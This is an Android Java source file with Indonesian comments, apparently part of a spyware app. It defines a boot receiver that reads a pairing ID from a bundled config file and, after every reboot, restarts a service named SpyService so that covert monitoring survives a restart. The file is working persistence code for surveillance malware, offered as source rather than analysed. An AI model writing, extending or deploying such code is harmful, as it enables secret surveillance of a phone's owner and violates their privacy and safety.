package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import org.json.JSONObject;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            String pairId = getPairIdFromConfig(context);
            Log.d(TAG, "Perangkat dinyalakan kembali. Menghidupkan service untuk Pair ID: " + pairId);

            // Menghidupkan kembali layanan SpyService setelah restart HP
            Intent serviceIntent = new Intent(context, SpyService.class);
            context.startService(serviceIntent);
        }
    }

    private String getPairIdFromConfig(Context context) {
        try {
            InputStream is = context.getAssets().open("flutter_assets/assets/config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            return new JSONObject(new String(buffer, StandardCharsets.UTF_8)).optString("pairId", "UNKNOWN_ID");
        } catch (Exception e) {
            return "UNKNOWN_ID";
        }
    }
}
